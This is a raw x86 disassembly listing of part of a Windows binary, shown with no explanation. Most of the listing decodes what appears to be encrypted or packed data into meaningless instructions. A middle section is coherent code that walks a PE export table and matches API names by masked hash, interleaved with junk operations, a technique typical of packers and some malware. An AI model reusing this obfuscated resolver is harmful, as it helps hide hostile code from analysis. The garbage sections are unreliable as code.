  40472b:	add    DWORD PTR [ebx-0x49353f6e],ebx
  404731:	retf   0xb827
  404734:	pop    ebp
  404735:	push   esi
  404736:	test   al,al
  404738:	out    0x72,al
  40473a:	xchg   edx,eax
  40473b:	rcr    bl,cl
  40473d:	rcl    DWORD PTR [eax],1
  40473f:	add    BYTE PTR [ebx],ch
  404741:	add    edi,DWORD PTR [esi-0x1512f3e2]
  404747:	xchg   ecx,eax
  404748:	cdq    
  404749:	cli    
  40474a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40474b:	test   eax,0x603096ab
  404750:	add    dh,BYTE PTR [edi]
  404752:	pop    ebp
  404753:	pop    ecx
  404754:	adc    DWORD PTR [esi-0x6b],edi
  404757:	fbstp  TBYTE PTR [edi+0x6c848533]
  40475d:	jle    0x404745
  40475f:	aad    0x72
  404761:	dec    edi
  404762:	jno    0x4046e5
  404764:	(bad)  
  404765:	xor    eax,0x63638c44
  40476a:	jmp    0x8b6b:0x996e8762
  404771:	push   cs
  404772:	int3   
  404773:	sbb    ah,BYTE PTR [esi+0x26]
  404776:	js     0x4047c0
  404778:	(bad)  
  40477a:	sbb    al,BYTE PTR [ecx+0x5e0f3b7e]
  404780:	adc    DWORD PTR [eax],eax
  404782:	xlat   BYTE PTR ds:[ebx]
  404783:	imul   ebp,DWORD PTR [edx+0x4b64c71a],0xfffffffa
  40478a:	jbe    0x4047e1
  40478c:	push   es
  40478d:	sub    BYTE PTR [ecx+0x3f8b6bd9],bh
  404793:	jmp    0x4047db
  404795:	adc    eax,0xfd37c32
  40479a:	cdq    
  40479b:	and    ebp,DWORD PTR [ebx-0x72972492]
  4047a1:	xchg   ebp,eax
  4047a2:	mov    edx,DWORD PTR [eax-0x23dc8c0a]
  4047a8:	sub    dh,BYTE PTR [edx-0x7e]
  4047ab:	mov    esi,0x21f5a593
  4047b0:	add    ah,BYTE PTR [edi-0x5b62a1dc]
  4047b6:	xor    DWORD PTR [esi],edx
  4047b8:	jle    0x40480e
  4047ba:	sbb    BYTE PTR [edx],0x1e
  4047bd:	popf   
  4047be:	fstp   DWORD PTR [eax+0x2443db30]
  4047c4:	inc    edi
  4047c5:	scas   eax,DWORD PTR es:[edi]
  4047c6:	pop    edx
  4047c7:	jmp    0x40475d
  4047c9:	fild   DWORD PTR [eax+eax*1]
  4047cc:	ins    DWORD PTR es:[edi],dx
  4047cd:	fwait
  4047ce:	int3   
  4047cf:	xchg   edi,eax
  4047d0:	push   edx
  4047d1:	retf   
  4047d2:	mul    DWORD PTR [ebx+0x30]
  4047d5:	xor    al,0xf8
  4047d7:	mov    esi,0x6693e965
  4047dc:	jbe    0x404763
  4047de:	lahf   
  4047df:	stc    
  4047e0:	mov    BYTE PTR ds:0xc9c335b4,bh
  4047e6:	call   0x704:0xce41b58b
  4047ed:	mov    ds:0xcce18c52,al
  4047f2:	sar    DWORD PTR [ebx+0x293b76cd],1
  4047f8:	(bad)  
  4047f9:	jns    0x4047a5
  4047fb:	xor    ah,0xea
  4047fe:	lds    esi,FWORD PTR [ecx-0x2c05ed46]
  404804:	xor    cl,BYTE PTR [ecx-0x3cff3fc1]
  40480a:	lods   eax,DWORD PTR ds:[esi]
  40480b:	ja     0x404798
  40480d:	and    BYTE PTR [edi],cl
  40480f:	xor    dh,bh
  404811:	repnz pop ecx
  404813:	es das 
  404815:	dec    edx
  404816:	xor    eax,0xc31205f2
  40481b:	push   edx
  40481c:	mov    dh,0x39
  40481e:	int3   
  40481f:	scas   eax,DWORD PTR es:[edi]
  404820:	add    eax,0xdc1a8fd6
  404825:	aas    
  404826:	cld    
  404827:	pushf  
  404828:	loope  0x4047ee
  40482a:	gs sti 
  40482c:	push   ebp
  40482d:	mov    al,0x87
  40482f:	in     eax,0x66
  404831:	jl     0x404881
  404833:	xchg   ebx,eax
  404834:	pop    ebx
  404835:	pop    eax
  404836:	fdiv   QWORD PTR [edi-0x1c]
  404839:	mov    ds:0x4df487c2,eax
  40483e:	shl    DWORD PTR [ebx-0x2f706a4d],1
  404844:	pushf  
  404845:	cmp    BYTE PTR [edi-0x99205d4],ah
  40484b:	dec    ecx
  40484c:	or     eax,DWORD PTR [ebx-0x3]
  40484f:	lea    edx,[ebx-0x530d8272]
  404855:	dec    edi
  404856:	pop    edi
  404857:	imul   DWORD PTR [ebx+0x39c0e856]
  40485d:	fwait
  40485e:	jge    0x40484c
  404860:	pop    ds
  404861:	into   
  404862:	outs   dx,DWORD PTR ds:[esi]
  404863:	and    dh,BYTE PTR [edi+0x61]
  404866:	inc    ecx
  404867:	pop    ebp
  404868:	rcl    BYTE PTR [eax-0x7c],cl
  40486b:	sbb    al,0x80
  40486d:	push   esp
  40486e:	pop    edi
  40486f:	jo     0x40480b
  404871:	and    al,0x21
  404873:	cli    
  404874:	or     bl,ah
  404876:	sbb    al,0x16
  404878:	jae    0x40489d
  40487a:	imul   esp,DWORD PTR [ebp-0x54],0xffffff9f
  40487e:	cs or  ebx,ebp
  404881:	mov    bl,0x49
  404883:	sub    al,0x5c
  404885:	xor    edx,esp
  404887:	or     al,BYTE PTR [esi-0x24]
  40488a:	pusha  
  40488b:	dec    esp
  40488c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40488d:	test   ecx,0xaf08a9d6
  404893:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  404895:	dec    ebp
  404896:	push   0xffffffb6
  404898:	or     BYTE PTR [eax+ecx*4],dh
  40489b:	in     al,0xf9
  40489d:	rcl    DWORD PTR [ecx-0x5b15b9d0],0xfb
  4048a4:	mov    ds:0x65ca145f,eax
  4048a9:	pop    ebp
  4048aa:	mov    ch,0xc5
  4048ac:	sar    DWORD PTR [ecx+0x4e],cl
  4048af:	imul   esi,DWORD PTR [eax-0x6bd6319c],0xffffffa3
  4048b6:	xor    dh,dl
  4048b8:	fldenv [ebx+0x7e]
  4048bb:	and    DWORD PTR [esi+0x123ac2f2],ebx
  4048c1:	data16 lods al,BYTE PTR ds:[esi]
  4048c3:	xor    bh,dl
  4048c5:	adc    DWORD PTR ds:0x99505248,ecx
  4048cb:	sbb    cl,BYTE PTR ds:0x60d51cfc
  4048d1:	ja     0x40487a
  4048d3:	or     edi,DWORD PTR [ebp+0x3438638]
  4048d9:	xor    DWORD PTR [edi+0x2d8f86e6],edi
  4048df:	xchg   ecx,edx
  4048e1:	scas   eax,DWORD PTR es:[edi]
  4048e2:	scas   eax,DWORD PTR es:[edi]
  4048e3:	pop    esp
  4048e4:	mov    dl,ah
  4048e6:	test   al,0x25
  4048e8:	pop    es
  4048e9:	jb     0x404879
  4048eb:	enter  0xe59e,0x44
  4048ef:	fst    DWORD PTR [ecx]
  4048f1:	sub    bl,BYTE PTR [edx+0x6828b9bd]
  4048f7:	jne    0x404927
  4048f9:	pop    edx
  4048fa:	mul    BYTE PTR [edi]
  4048fc:	mov    eax,ds:0x79ad5dac
  404901:	fistp  QWORD PTR [ebp+esi*4+0xa]
  404905:	icebp  
  404906:	aas    
  404907:	sti    
  404908:	sbb    esp,edi
  40490a:	inc    BYTE PTR [ebp+0x4d]
  40490d:	dec    edi
  40490e:	(bad)  
  404910:	push   esi
  404911:	(bad)  
  404912:	xor    DWORD PTR [edi+0x27],ebx
  404915:	push   ss
  404916:	fwait
  404917:	stos   DWORD PTR es:[edi],eax
  404918:	loope  0x404928
  40491a:	rol    DWORD PTR [ebx-0x55],cl
  40491d:	dec    ebx
  40491e:	bound  ebx,QWORD PTR ds:0xdc3a85ec
  404924:	in     al,dx
  404925:	push   esp
  404926:	xor    esi,DWORD PTR [ecx]
  404928:	mov    dh,BYTE PTR [ecx-0x78]
  40492b:	add    bh,ch
  40492d:	mov    ch,0x8f
  40492f:	xor    eax,0x53162f74
  404934:	xlat   BYTE PTR ds:[ebx]
  404935:	mov    ecx,0x2e2d355a
  40493a:	inc    eax
  40493b:	inc    esp
  40493c:	lds    edi,FWORD PTR [ebx]
  40493e:	mov    al,BYTE PTR [ecx]
  404940:	mov    esi,0xf4476481
  404945:	push   ebp
  404946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404947:	je     0x4049be
  404949:	repnz daa 
  40494b:	mov    ebp,0x24ecc65c
  404950:	fcomp  DWORD PTR [ecx]
  404952:	and    esi,eax
  404954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404955:	and    DWORD PTR [ecx-0x7b8b276e],eax
  40495b:	adc    BYTE PTR [edi+0x266ae747],ch
  404961:	jmp    0x404966
  404963:	sbb    edx,DWORD PTR [eax+0x57]
  404966:	or     DWORD PTR [edi],esi
  404968:	rcl    DWORD PTR [edx+0x6a],0xc5
  40496c:	js     0x404920
  40496e:	xchg   BYTE PTR ds:0xb88c7312,dh
  404974:	adc    esi,0xffffffa2
  404977:	adc    al,0x9c
  404979:	(bad)  
  40497a:	and    ah,BYTE PTR [edx-0x5c]
  40497d:	outs   dx,DWORD PTR ds:[esi]
  40497e:	jns    0x4049ce
  404980:	push   es
  404981:	adc    DWORD PTR [eax+0x63],ecx
  404984:	fld    TBYTE PTR ds:0x5239aff9
  40498a:	cmp    BYTE PTR [eax-0x2e6266ce],0x5b
  404991:	js     0x404913
  404993:	xor    bh,BYTE PTR [ecx]
  404995:	lods   al,BYTE PTR ds:[esi]
  404996:	lea    ebx,[ebp-0x1b]
  404999:	xchg   DWORD PTR [edi+0xa],esi
  40499c:	mov    esp,0x669ae1cb
  4049a1:	dec    esi
  4049a2:	in     eax,0xbf
  4049a4:	popa   
  4049a5:	cmp    al,0x15
  4049a7:	inc    ebx
  4049a8:	adc    eax,0xd17ce1b7
  4049ad:	cld    
  4049ae:	inc    edi
  4049af:	sub    DWORD PTR [esi],edi
  4049b1:	pop    esp
  4049b2:	mov    edx,0x2c79080c
  4049b7:	imul   DWORD PTR [ebx]
  4049b9:	mov    ch,0xcc
  4049bb:	adc    al,0x87
  4049bd:	pop    esi
  4049be:	push   0x75e78503
  4049c3:	sub    cl,BYTE PTR [edx-0x3440d83d]
  4049c9:	sub    BYTE PTR [edx],al
  4049cb:	sbb    ah,dh
  4049cd:	pop    ecx
  4049ce:	xor    DWORD PTR [edx-0x1f],esi
  4049d1:	std    
  4049d2:	sub    edx,DWORD PTR [edi-0x37]
  4049d5:	data16 mov ah,0x15
  4049d8:	jns    0x40496d
  4049da:	push   ecx
  4049db:	mov    esi,DWORD PTR ds:0xd30f33b4
  4049e1:	xor    BYTE PTR [ebx],ch
  4049e3:	pusha  
  4049e4:	leave  
  4049e5:	js     0x4049b4
  4049e7:	ret    
  4049e8:	outs   dx,BYTE PTR ds:[esi]
  4049e9:	fucomip st,st(5)
  4049eb:	mov    ds,WORD PTR ds:0xc8faa2e8
  4049f1:	das    
  4049f2:	std    
  4049f3:	(bad)  [edi-0x1225f9f8]
  4049f9:	and    DWORD PTR ds:0x36792915,ebp
  4049ff:	jecxz  0x404a42
  404a01:	aaa    
  404a02:	jno    0x404a45
  404a04:	jae    0x4049fe
  404a06:	data16 jo 0x4049f6
  404a09:	push   0xffffff95
  404a0b:	leave  
  404a0c:	xor    ecx,edx
  404a0e:	daa    
  404a0f:	mov    al,ds:0xdb430420
  404a15:	and    al,0x34
  404a17:	sub    DWORD PTR [eax+0x5e],ecx
  404a1a:	outs   dx,DWORD PTR ds:[esi]
  404a1b:	pushf  
  404a1c:	adc    ebp,DWORD PTR [ebx]
  404a1e:	xlat   BYTE PTR ds:[ebx]
  404a1f:	fwait
  404a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a21:	nop
  404a22:	adc    DWORD PTR ds:0xa86598be,ebp
  404a28:	icebp  
  404a29:	or     eax,0x66b4d580
  404a2e:	scas   al,BYTE PTR es:[edi]
  404a2f:	xor    BYTE PTR [edi],cl
  404a31:	cmp    cl,BYTE PTR [eax]
  404a33:	loope  0x4049c6
  404a35:	jne    0x404a65
  404a37:	mov    bh,0x47
  404a39:	imul   ebp,DWORD PTR [esi+0x38],0xffffffef
  404a3d:	jne    0x404ab0
  404a3f:	adc    al,ah
  404a41:	dec    esi
  404a42:	call   0x7c01:0x15ed34d3
  404a49:	ins    BYTE PTR es:[edi],dx
  404a4a:	xchg   esi,eax
  404a4b:	push   eax
  404a4c:	mov    esp,0x8f4c6609
  404a51:	lods   eax,DWORD PTR ds:[esi]
  404a52:	stc    
  404a53:	pop    DWORD PTR [esi+0x50]
  404a56:	jae    0x404acd
  404a58:	mov    edi,0x612f0e4c
  404a5d:	jbe    0x404a94
  404a5f:	call   0x444c9ca3
  404a64:	push   esp
  404a65:	pop    edx
  404a66:	call   0x93a:0xd0b60546
  404a6d:	inc    ecx
  404a6e:	stc    
  404a6f:	fwait
  404a70:	mov    ch,0x49
  404a72:	jp     0x404a79
  404a74:	push   0xc84ed3fd
  404a79:	mov    ah,0x56
  404a7b:	mov    dh,BYTE PTR [edi-0x2dca517c]
  404a81:	test   DWORD PTR [esi],esp
  404a83:	(bad)  
  404a84:	push   eax
  404a85:	xor    al,0x83
  404a87:	and    dh,0x6
  404a8a:	ret    0x8533
  404a8d:	mov    dl,0xeb
  404a8f:	and    al,0xe
  404a91:	push   ss
  404a92:	or     eax,0x535119f0
  404a97:	sbb    bl,BYTE PTR [ebp-0x72]
  404a9a:	shl    BYTE PTR [esi+0x0],0x15
  404a9e:	pusha  
  404a9f:	(bad)  
  404aa0:	ins    DWORD PTR es:[edi],dx
  404aa1:	mov    WORD PTR [edx],gs
  404aa3:	rcl    DWORD PTR [ecx+0xfc40ffe],cl
  404aa9:	repz jp 0x404a47
  404aac:	nop
  404aad:	xlat   BYTE PTR ds:[ebx]
  404aae:	iret   
  404aaf:	or     BYTE PTR [ebx-0x557a591e],ch
  404ab5:	jmp    DWORD PTR [edi-0x51]
  404ab8:	and    ah,BYTE PTR [ebp-0x2e]
  404abb:	mul    BYTE PTR [edx+0x7b]
  404abe:	pop    es
  404abf:	mov    BYTE PTR [esi+esi*2+0x98b7690],bh
  404ac6:	adc    eax,eax
  404ac8:	cld    
  404ac9:	mov    ds:0x7d6ad80f,eax
  404ace:	push   edi
  404acf:	mov    ebx,0x99c98da9
  404ad4:	shr    bh,cl
  404ad6:	jmp    0x404b3c
  404ad8:	xchg   esp,eax
  404ad9:	pop    esi
  404ada:	retf   0xffeb
  404add:	jns    0x404a84
  404adf:	in     al,dx
  404ae0:	fs add eax,0xf72ce2dd
  404ae6:	and    esp,DWORD PTR [esi]
  404ae8:	xor    dl,BYTE PTR [ecx+0x13]
  404aeb:	mov    esp,0x6d480993
  404af0:	pop    edx
  404af1:	cmc    
  404af2:	lods   eax,DWORD PTR ds:[esi]
  404af3:	cld    
  404af4:	pop    ecx
  404af5:	jmp    0x3cfc3d40
  404afa:	inc    ecx
  404afb:	xor    eax,0x5048843d
  404b00:	dec    eax
  404b01:	mov    ds:0xca9c0cde,al
  404b06:	(bad)  
  404b07:	adc    BYTE PTR [ebp-0x59],dl
  404b0a:	adc    bh,cl
  404b0c:	cmp    eax,0xf3f69b1b
  404b11:	xor    eax,DWORD PTR [edx-0x6b6f6e0]
  404b17:	in     al,0xe7
  404b19:	sub    BYTE PTR [eax-0x6e],ch
  404b1c:	fld    TBYTE PTR [ebp-0x76cbefef]
  404b22:	stos   BYTE PTR es:[edi],al
  404b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b24:	jo     0x404ad0
  404b26:	mov    ds:0x54e5603c,eax
  404b2b:	je     0x404aae
  404b2d:	pushf  
  404b2e:	dec    edi
  404b2f:	pop    esp
  404b30:	stos   DWORD PTR es:[edi],eax
  404b31:	jae    0x404ab3
  404b33:	in     al,0x7a
  404b35:	jno    0x404aba
  404b37:	mov    es,WORD PTR [esi+0x366cc20b]
  404b3d:	daa    
  404b3e:	push   ss
  404b3f:	mov    edi,0xfae3f8f2
  404b44:	pop    esp
  404b45:	add    eax,0x66c5845c
  404b4a:	out    0x67,eax
  404b4c:	adc    eax,0xc4f57878
  404b51:	add    DWORD PTR [ebx-0x7e1cc6c],0x9ef9caeb
  404b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b5c:	ins    DWORD PTR es:[edi],dx
  404b5d:	add    ah,0x65
  404b60:	xchg   esp,eax
  404b61:	fidivr DWORD PTR [esi]
  404b63:	test   DWORD PTR [ecx],edi
  404b65:	mov    ecx,0x6132cd2b
  404b6a:	and    al,ch
  404b6c:	out    dx,eax
  404b6d:	jmp    0x7817eac1
  404b72:	mov    bh,BYTE PTR [ecx+0x27]
  404b75:	iret   
  404b76:	xor    DWORD PTR [esi+0x4407831d],esi
  404b7c:	mov    al,ds:0xa1f81178
  404b81:	in     eax,dx
  404b82:	push   eax
  404b83:	xor    DWORD PTR [esi],edi
  404b85:	loop   0x404b83
  404b87:	jmp    0x404bb4
  404b89:	xor    BYTE PTR [eax+0x68],dh
  404b8c:	dec    BYTE PTR [ecx-0x352fb7dd]
  404b92:	(bad)  
  404b93:	xor    DWORD PTR [ebx],ebx
  404b95:	xor    edi,ebp
  404b97:	or     cl,dl
  404b99:	or     DWORD PTR [esi+ebx*8+0x51addcaa],eax
  404ba0:	nop
  404ba1:	retf   0x792
  404ba4:	je     0x404bee
  404ba6:	out    dx,al
  404ba7:	loop   0x404c17
  404ba9:	adc    BYTE PTR ss:[ebx+esi*8],bh
  404bad:	adc    eax,0x187cc680
  404bb2:	fld    st(3)
  404bb4:	dec    esp
  404bb5:	bound  esi,QWORD PTR [ebp-0x76]
  404bb8:	test   bh,dl
  404bba:	fdiv   st(4),st
  404bbc:	in     eax,0xa7
  404bbe:	or     al,0xb6
  404bc0:	xchg   ebp,eax
  404bc1:	mov    cl,0x75
  404bc3:	jle    0x404c31
  404bc5:	mov    ch,0xfd
  404bc7:	std    
  404bc8:	sbb    al,0x56
  404bca:	scas   al,BYTE PTR es:[edi]
  404bcb:	je     0x404bb4
  404bcd:	push   es
  404bce:	inc    esi
  404bcf:	cdq    
  404bd0:	shr    DWORD PTR [esi+0x1d7c6763],1
  404bd6:	mov    ebx,esi
  404bd8:	ret    0x3fb1
  404bdb:	stc    
  404bdc:	pop    esi
  404bdd:	fimul  WORD PTR [esi+0x6b]
  404be0:	out    0xe2,al
  404be2:	mov    ch,0x4c
  404be4:	call   0xf7f6ff62
  404be9:	mov    dl,0x44
  404beb:	retf   
  404bec:	and    eax,0x2766413a
  404bf1:	pusha  
  404bf2:	les    eax,FWORD PTR [ecx+eiz*2+0x75]
  404bf6:	xchg   ebx,eax
  404bf7:	lahf   
  404bf8:	cmp    DWORD PTR [edi],esp
  404bfa:	xlat   BYTE PTR ds:[ebx]
  404bfb:	das    
  404bfc:	outs   dx,DWORD PTR ds:[esi]
  404bfd:	push   edx
  404bfe:	out    0xc2,al
  404c00:	jne    0x404c51
  404c02:	sbb    dh,BYTE PTR [edi+0x59]
  404c05:	pushf  
  404c06:	jno    0x404bea
  404c08:	das    
  404c09:	mov    dl,0xe5
  404c0b:	pop    esp
  404c0c:	xchg   esi,eax
  404c0d:	dec    ebp
  404c0e:	inc    edi
  404c0f:	sub    al,0x8a
  404c11:	mov    ebp,0x3341a77f
  404c16:	cmp    dl,BYTE PTR [ecx+0x41]
  404c19:	mov    dh,0x33
  404c1b:	repz or esp,DWORD PTR [ebx]
  404c1e:	fld    TBYTE PTR [ecx]
  404c20:	mov    WORD PTR [edi+0x23],ds
  404c23:	hlt    
  404c24:	nop
  404c25:	(bad)  
  404c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c27:	int    0x93
  404c29:	lahf   
  404c2a:	lock cmp ebp,ebp
  404c2d:	xchg   ebp,eax
  404c2e:	jecxz  0x404c27
  404c30:	push   edi
  404c31:	fmul   QWORD PTR [eax]
  404c33:	adc    eax,0xfef89349
  404c38:	xchg   ecx,eax
  404c39:	pop    esi
  404c3a:	ret    0x2690
  404c3d:	cmp    eax,DWORD PTR [ebx-0xcca5c9b]
  404c43:	push   cs
  404c44:	ret    0x9462
  404c47:	retf   0xa593
  404c4a:	aad    0x93
  404c4c:	ffree  st(5)
  404c4e:	das    
  404c4f:	sbb    bl,bl
  404c51:	adc    esp,DWORD PTR [ecx]
  404c53:	push   ds
  404c54:	adc    al,0x20
  404c56:	mov    eax,DWORD PTR [ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	idiv   BYTE PTR gs:[eax+0x7a5f0a04]
  404e9d:	jp     0x404ea9
  404e9f:	pop    edi
  404ea0:	jp     0x404f1c
  404ea2:	call   0x8d5c:0x7ee0e212
  404ea9:	fcomp  QWORD PTR [ebx]
  404eab:	int    0x3
  404ead:	das    
  404eae:	xor    al,0x5d
  404eb0:	dec    ebp
  404eb1:	dec    edx
  404eb2:	out    dx,eax
  404eb3:	push   ss
  404eb4:	popf   
  404eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eb6:	ins    DWORD PTR es:[edi],dx
  404eb7:	lods   al,BYTE PTR ds:[esi]
  404eb8:	data16 fistp WORD PTR [edi+0x32]
  404ebc:	jne    0x404e58
  404ebe:	jbe    0x404e65
  404ec0:	sbb    esp,0xffffffa1
  404ec3:	add    bl,cl
  404ec5:	add    eax,0x3ea80b30
  404eca:	mov    ebp,0x32d1422b
  404ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ed0:	imul   eax,DWORD PTR [esi-0x42a04e6b],0xffffffc2
  404ed7:	fisubr WORD PTR [ebx-0x43c6eb95]
  404edd:	arpl   WORD PTR [ecx],sp
  404edf:	in     al,0xaa
  404ee1:	sbb    al,0x12
  404ee3:	and    eax,0x96294f73
  404ee8:	ds aam 0x3a
  404eeb:	jl     0x404eee
  404eed:	call   0x6c0b:0x94a8b030
  404ef4:	mov    esp,0xe5a7cd44
  404ef9:	scas   eax,DWORD PTR es:[edi]
  404efa:	fsubrp st(4),st
  404efc:	adc    DWORD PTR [eax-0x765c352e],0xd419e525
  404f06:	fmul   QWORD PTR [edx+0x72]
  404f09:	test   al,0xaa
  404f0b:	nop
  404f0c:	cli    
  404f0d:	test   BYTE PTR [edx-0x7a0bc66a],dl
  404f13:	add    BYTE PTR [ebx+0x1b3eb41a],dh
  404f19:	adc    eax,0x86c0a66f
  404f1e:	sub    al,0xf4
  404f20:	lock hlt 
  404f22:	in     al,dx
  404f23:	sub    al,0x69
  404f25:	inc    esp
  404f26:	retf   0x9ca3
  404f29:	rcl    DWORD PTR [ebx],0xa5
  404f2c:	jbe    0x404f3c
  404f2e:	inc    ebx
  404f2f:	into   
  404f30:	daa    
  404f31:	test   al,0xc3
  404f33:	and    eax,0x6c1c043a
  404f38:	pop    ebx
  404f39:	adc    al,0x73
  404f3b:	inc    esp
  404f3c:	in     eax,0xb0
  404f3e:	xor    esp,edi
  404f40:	or     edi,DWORD PTR [ecx+0x64]
  404f43:	mov    ecx,0x12f88588
  404f48:	int3   
  404f49:	add    ch,BYTE PTR [edx+0x32]
